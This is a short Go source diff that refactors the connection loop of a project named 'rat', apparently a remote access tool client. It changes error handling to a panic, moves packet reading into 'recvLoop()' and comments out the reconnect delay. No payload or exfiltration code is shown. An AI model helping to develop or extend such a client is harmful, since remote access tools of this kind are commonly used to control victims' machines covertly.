@@ -10,7 +10,6 @@ import (
 	"rat/shared"
 	"rat/shared/installpath"
 	"rat/shared/network"
-	"time"
 
 	"github.com/xtaci/smux"
 )
@@ -76,8 +75,7 @@ func start(config shared.BinaryConfig) {
 		}
 
 		if err != nil {
-			fmt.Println(err.Error())
-			goto end
+			panic(err)
 		}
 
 		Queue = make(chan OutgoingPacket)
@@ -94,18 +92,11 @@ func start(config shared.BinaryConfig) {
 
 		con.Init()
 
-		for {
-			_, err := con.ReadPacket()
-			if err != nil {
-				fmt.Println(err.Error())
-				con.Close()
-				break
-			}
-		}
+		con.recvLoop()
 
-	end:
+		/* end:
 		Close()
-		time.Sleep(time.Second * time.Duration(config.Delay))
+		time.Sleep(time.Second * time.Duration(config.Delay)) */
 	}
 }
 
